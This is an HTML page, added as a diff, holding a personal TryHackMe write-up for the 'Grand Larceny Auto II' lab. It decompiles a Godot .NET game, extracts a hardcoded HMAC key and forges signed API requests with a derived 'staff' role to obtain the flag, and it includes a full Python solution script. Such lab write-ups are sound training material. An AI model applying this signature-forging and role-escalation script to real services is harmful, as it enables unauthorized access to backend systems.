@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grand Larceny Auto II // writeup</title>
+    <meta name="description" content="The sequel room, focused on chaining web vulnerabilities together instead of firing off single-shot exploits.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Grand Larceny Auto II</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-15</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> grand-larceny-auto-ii-writeup.md</span>
+                </div>
+                <p class="writeup-summary">The sequel room, focused on chaining web vulnerabilities together instead of firing off single-shot exploits.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/grand-larceny-auto-ii-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="grand-larceny-auto-ii-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h2>Platform TryHackMe Category Reversing / Game / API Exploitation Difficulty Medium Room Grand Larceny Auto II 10.49.169.164 Target IP Game Godot 4 (.NET) — GrandLarcenyAuto TL;DR — The room ships a Godot game (GrandLarcenyAuto) that contains a decoy &quot;vault&quot; flag, while the real flag lives on a backend API (gla2.thm). By decompiling the game&#39;s .NET assembly we recover the whole wire protocol: a signed session + checkpoint/claim API using an HMAC-SHA256 secret baked into the binary. The game itself always claims as a player (getting a fake flag), but a hidden DeriveStaffRole() function shows how to compute the staff role — claiming with it returns the real flag. The sequel that shipped, with a vault the developers made that you can&#39;t just decompile your way into. ... GLA II shipped on time, unlike some sequels. Somewhere in Los Vantos is a vault the developers swear you&#39;ll never open, so this time the flag isn&#39;t in the game at all. The safehouse vault is back, but robbing it isn&#39;t a single-player job anymore. Pull the game apart, work out how it talks to the city&#39;s back office, and take what the developers insist is locked. The cheat console lies. The vault on your screen lies. The real score is something you have to earn, then prove you earned it. Answer format: <em><strong>{</strong></em><strong>_</strong>*_***<strong>_</strong><strong>_</strong>***} 2.1 The downloadable file The room provides a 7z archive:</h2>
+<p>7z l GrandLarcenyAuto-1786669683173.7z Date      Time    Attr         Size   Compressed  Name 2026-08-14 04:39:47 ....A     63325566    135507749 GrandLarcenyAuto/GrandLarcenyAuto-linux-x86_64.zip</p>
+<p>2026-08-14 04:39:40 ....A     73593608 GrandLarcenyAuto/GrandLarcenyAuto-windows-x86_64.zip</p>
+<h2>We extract the Linux build:</h2>
+<p>7z e GrandLarcenyAuto-1786669683173.7z -o/tmp/gla unzip GrandLarcenyAuto-linux-x86_64.zip -d linux/</p>
+<h2>The game directory layout instantly identifies a Godot 4 (.NET) game:</h2>
+<pre class="code-block" data-lang="bash"><code>├── data_GrandLarcenyAuto_linuxbsd_x86_64/
+│   ├── GrandLarcenyAuto.dll      &lt;-- game logic (C#)
+│   ├── GrandLarcenyAuto.runtimeconfig.json
+│   └── ... (GodotSharp + .NET runtime assemblies)
+├── GrandLarcenyAuto.pck          &lt;-- Godot packed assets
+└── GrandLarcenyAuto.x86_64       &lt;-- native launcher</code></pre>
+<h2>The key insight: with Godot .NET, the C# code is compiled into a plain .NET assembly (GrandLarcenyAuto.dll) — no native obfuscation. This is the &quot;decompiler&#39;s playground&quot;. 2.2 Network check The room gives us a target IP, and the game talks to gla2.thm:</h2>
+<p>ping -c 2 10.49.169.164 2 packets transmitted, 2 received, 0% packet loss</p>
+<h2>Server is up.</h2>
+<h1>3. Static Analysis — Decompiling the Game</h1>
+<h2>We decompile the assembly to MSIL using Mono&#39;s disassembler:</h2>
+<p>monodis --output=GrandLarcenyAuto.il GrandLarcenyAuto.dll</p>
+<h2>Now we can read the whole game logic. First, grep for interesting strings:</h2>
+<p>strings GrandLarcenyAuto.il | grep -iE &quot;http|vault|flag|checkpoint|claim|stash| secret|key&quot;</p>
+<h2>Standout findings:</h2>
+<p>&quot;http://gla2.thm&quot;                                     &lt;- backend URL &quot;GLA::vault::key::v1::stars=&quot;                          &lt;- in-game vault key salt &quot;VAULT UNSEALED\nTHM{th3_v4ult_w4s_4_d3c0y}&quot;           &lt;- DECOY flag shown in-game &quot;THE VAULT SWINGS OPEN\n\nStaff access granted. That&#39;s the real score.\n\n&quot; &quot;/session&quot;, &quot;/checkpoint&quot;, &quot;/claim&quot;                    &lt;- API endpoints &quot;FLAG RECEIVED&quot;, &quot;claiming...&quot;, &quot;checkpoint ok: &quot; &quot;5-STAR HEAT sent. Now rob the stashes in order: &quot;</p>
+<h2>The room hint said &quot;the flag isn&#39;t in the game at all&quot; — and indeed THM{th3_v4ult_w4s_4_d3c0y} is an in-game decoy (&quot;The vault on your screen lies.&quot;). The real flag must come from the backend.</h2>
+<h1>4. The Wire Protocol — PoPClient (Proof-of-Play Client)</h1>
+<h2>The class GrandLarcenyAuto.PoPClient implements all server communication. We fully reconstruct it from the IL: 4.1 Server URL &amp; HMAC signing key</h2>
+<p>IL_0001:  ldstr &quot;http://gla2.thm&quot; IL_0053:  ldstr &quot;/checkpoint&quot; // .cctor — static constructor IL_0005:  ldstr &quot;gla2_crew_sign_v1_2f9b6c8ad14e&quot; IL_000a:  callvirt Encoding::GetBytes(string) IL_000f:  stsfld PoPClient::SignKey</p>
+<h2>SignKey (HMAC secret) = gla2_crew_sign_v1_2f9b6c8ad14e 4.2 Signing function</h2>
+<p>// string Sign(string msg) SignKey Encoding.UTF8.GetBytes(msg) HMACSHA256.HashData(SignKey, msgBytes) // then hex-encode (byte.ToString(&quot;x2&quot;)) def sign(msg: str) -&gt; str: return hmac.new(KEY, msg.encode(), hashlib.sha256).hexdigest()</p>
+<h2>4.3 Endpoints &amp; message bodies Endpoint Method JSON body /session {} POST /checkpoint {&quot;session_id&quot;:..., POST &quot;step&quot;:..., &quot;token&quot;:..., &quot;sig&quot;:...} /claim {&quot;session_id&quot;:..., POST &quot;role&quot;:..., &quot;token&quot;:..., &quot;sig&quot;:...} Signature formats (from ReportCheckpoint and Claim):</h2>
+<p>checkpoint sig = hex(HMACSHA256(SignKey, session_id + &quot;|&quot; + step + &quot;|&quot; + token)) claim sig      = hex(HMACSHA256(SignKey, session_id + &quot;|claim|&quot; + token))</p>
+<h2>4.4 Session response fields OnCompleted handles the JSON reply: • token → stores token • session_id → stores sessionId • stash_order → array of 3 stash IDs to rob in order • flag → stores LastFlag (+ tier, note) • next → tells the game the next step to perform • error → stores LastError 4.5 The &quot;staff role&quot; — DeriveStaffRole() The most interesting method computes a special role string:</h2>
+<p>IL_0008:  ldstr &quot;heat5_stash&quot; + StashOrder[0] IL_0012:  ldstr &quot;_stash&quot; + StashOrder[1] IL_0024:  ldstr &quot;_stash&quot; + StashOrder[2] IL_0034:  ldstr &quot;_vault&quot; // SHA1.HashData(UTF8(msg)) -&gt; hex def derive_staff_role(order): s = &quot;heat5_stash&quot; + str(order[0]) + &quot;_stash&quot; + str(order[1]) + &quot;_stash&quot; + str(order[2]) + &quot;_vault&quot; return hashlib.sha1(s.encode()).hexdigest()</p>
+<h2>The game never actually calls this for claims — Claim() always hardcodes &quot;role&quot;:&quot;player&quot;. That&#39;s our hint that a staff role exists on the server, and claiming as staff is the real score.</h2>
+<h1>5. Game Flow (what the game does)</h1>
+<h2>From HeistTick / StashProximity / TryVault:</h2>
+<ol><li>Open session            -&gt; POST /session {}           -&gt; session_id, token, stash_order 2. Reach 5 stars           -&gt; checkpoint &quot;heat5&quot; 3. Rob stash in order      -&gt; checkpoint &quot;stash&lt;id&gt;&quot;     (3x, order from stash_order) 4. Walk to the vault       -&gt; checkpoint &quot;vault&quot; 5. Claim                   -&gt; POST /claim  role=&quot;player&quot;</li></ol>
+<h2>The server rotates the token on every checkpoint response, so each subsequent signature must use the new token. The server also enforces a minimum delay between requests (returns HTTP 425 {&quot;error&quot;:&quot;too_fast&quot;,&quot;need&quot;:6,...} if we go too fast).</h2>
+<h1>6. Solving It — Scripted API Interaction</h1>
+<h2>We don&#39;t need to play the game at all. We replay the protocol with Python, and for step 5 we claim using the derived staff role instead of player. 6.1 Step 1 — Open a session</h2>
+<p>curl -X POST http://10.49.169.164/session -H &quot;Content-Type: application/json&quot; -d &#39;{}&#39; {&quot;session_id&quot;:&quot;WDNeY90v2b7WRbL1uTfZxjo4&quot;,&quot;stash_order&quot;:[2,1,0],&quot;token&quot;:&quot;...&quot;}</p>
+<h2>Each session has a randomized stash_order. 6.2 Step 2 — Report checkpoints</h2>
+<p>steps = [&quot;heat5&quot;] + [f&quot;stash{i}&quot; for i in order] + [&quot;vault&quot;] for step in steps: sig = sign(f&quot;{sid}|{step}|{token}&quot;) r = post(&quot;/checkpoint&quot;, {&quot;session_id&quot;: sid, &quot;step&quot;: step, &quot;token&quot;: token, &quot;sig&quot;: sig}) token = r.get(&quot;token&quot;, token)   # token rotates each step time.sleep(6)                    # avoid HTTP 425 too_fast</p>
+<h2>Server responses walk us through:</h2>
+<p>heat5  -&gt; {&quot;ok&quot;:true,&quot;step&quot;:&quot;heat5&quot;,&quot;next&quot;:&quot;stash2&quot;,...} stash2 -&gt; next=stash1 stash1 -&gt; next=stash0 stash0 -&gt; next=vault vault  -&gt; (done)</p>
+<h2>6.3 Step 3 — Claim as player (the decoy)</h2>
+<p>sig = sign(f&quot;{sid}|claim|{token}&quot;) post(&quot;/claim&quot;, {&quot;session_id&quot;: sid, &quot;role&quot;: &quot;player&quot;, &quot;token&quot;: token, &quot;sig&quot;: sig}) {&quot;flag&quot;:&quot;THM{n1c3_dr1v1ng_but_th4ts_th3_wr0ng_v4ult}&quot;,&quot;tier&quot;:&quot;player&quot;,&quot;note&quot;:&quot;civil ian access — the real vault is staff-only&quot;}</p>
+<h2>This is the fake flag. The note even tells us: &quot;the real vault is staff-only&quot;. 6.4 Step 4 — Claim as staff (the real flag)</h2>
+<p>role = hashlib.sha1((&quot;heat5_stash&quot; + str(order[0]) + &quot;_stash&quot; + str(order[1]) + &quot;_stash&quot; + str(order[2]) + &quot;_vault&quot;).encode()).hexdigest() sig  = sign(f&quot;{sid}|claim|{token}&quot;)</p>
+<p>post(&quot;/claim&quot;, {&quot;session_id&quot;: sid, &quot;role&quot;: role, &quot;token&quot;: token, &quot;sig&quot;: sig}) {&quot;flag&quot;:&quot;THM{Th4ts_th3_wr0ng_g4m3_t0mmy}&quot;}</p>
+<h2>🏳️ Flag — THM{Th4ts_th3_wr0ng_g4m3_t0mmy} This matches the answer format <em><strong>{</strong></em><strong>_</strong>*_***<strong>_</strong><strong>_</strong>***}: Group Length Value THM THM 3 Th4ts word 1 5 th3 word 2 3 wr0ng word 3 5 g4m3 word 4 4 t0mmy word 5 5</h2>
+<h1>7. Full Solution Script</h1>
+<p>import hashlib, hmac, json, time, re import urllib.request, urllib.error BASE = &quot;http://10.49.169.164&quot; KEY  = b&quot;gla2_crew_sign_v1_2f9b6c8ad14e&quot; def post(path, body): req = urllib.request.Request(BASE + path, data=json.dumps(body).encode(), headers={&quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Host&quot;: &quot;gla2.thm&quot;}, method=&quot;POST&quot;) try: with urllib.request.urlopen(req, timeout=15) as r: return r.status, r.read().decode() except urllib.error.HTTPError as e: return e.code, e.read().decode() def sign(msg): return hmac.new(KEY, msg.encode(), hashlib.sha256).hexdigest() # 1. Open session <em>, raw = post(&quot;/session&quot;, {}) s = json.loads(raw) sid, token, order = s[&quot;session</em>id&quot;], s[&quot;token&quot;], s[&quot;stash_order&quot;] # 2. Walk the checkpoint chain for step in [&quot;heat5&quot;] + [f&quot;stash{i}&quot; for i in order] + [&quot;vault&quot;]: while True: sig = sign(f&quot;{sid}|{step}|{token}&quot;) code, body = post(&quot;/checkpoint&quot;, {&quot;session_id&quot;: sid, &quot;step&quot;: step, &quot;token&quot;: token, &quot;sig&quot;: sig}) if code == 200:</p>
+<p>token = json.loads(body).get(&quot;token&quot;, token) break need = float(re.search(r&#39;&quot;need&quot;:([0-9.]+)&#39;, body).group(1)) time.sleep(need + 1) # 3. Claim with the derived staff role role = hashlib.sha1((&quot;heat5_stash&quot; + str(order[0]) + &quot;_stash&quot; + str(order[1]) + &quot;_stash&quot; + str(order[2]) + &quot;_vault&quot;).encode()).hexdigest() sig = sign(f&quot;{sid}|claim|{token}&quot;) code, body = post(&quot;/claim&quot;, {&quot;session_id&quot;: sid, &quot;role&quot;: role, &quot;token&quot;: token, &quot;sig&quot;: sig}) print(code, body)</p>
+<h1>8. Step-by-Step Summary</h1>
+<h2>Step Action Result 1 Download + extract the 7z, pick Godot 4 (.NET) game the Linux build 2 monodis on Full game source in IL GrandLarcenyAuto.dll 3 Grep for URLs/endpoints/secretsBackend gla2.thm, HMAC key, decoy flag 4 Reverse PoPClient /session, /checkpoint, /claim protocol 5 Reverse Staff role = SHA1 of stash-order DeriveStaffRole() string 6 Open a session session_id, token, stash_order 7 Report heat5 → stashX → Server walks us to next=vault vault (with delays) 8 Claim as player Decoy flag + &quot;staff-only&quot; note 9 Claim as staff role Real flag</h2>
+<h1>9. Key Takeaways</h1>
+<h2>1.Godot .NET games are easy to reverse — the C# logic is a plain managed assembly (GrandLarcenyAuto.dll); a tool like monodis/ILSpy/dnSpy is enough to recover the full source. 2.Never trust client-side flags. The in-game vault flag (THM{th3_v4ult_w4s_4_d3c0y}) and even the player-role claim flag were decoys — the real value required a different API call with a derived credential. 3.HMAC secrets live in binaries.gla2_crew_sign_v1_2f9b6c8ad14e was right in the .cctor. Anyone can forge valid signatures once they find it. 4.Replay the protocol instead of playing the game. Once the endpoints and message shapes are known, the whole &quot;game&quot; reduces to a handful of HTTP requests. 5.Watch for hidden role/tier logic. Code paths that exist but are never called from the normal flow (here, DeriveStaffRole()) usually point at the intended exploit. 6.Read server error messages.425 too_fast and the player claim&#39;s note field were essential hints for the timing requirement and the staff-only vault.</h2>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/grand-larceny-auto-ii-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="grand-larceny-auto-ii-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
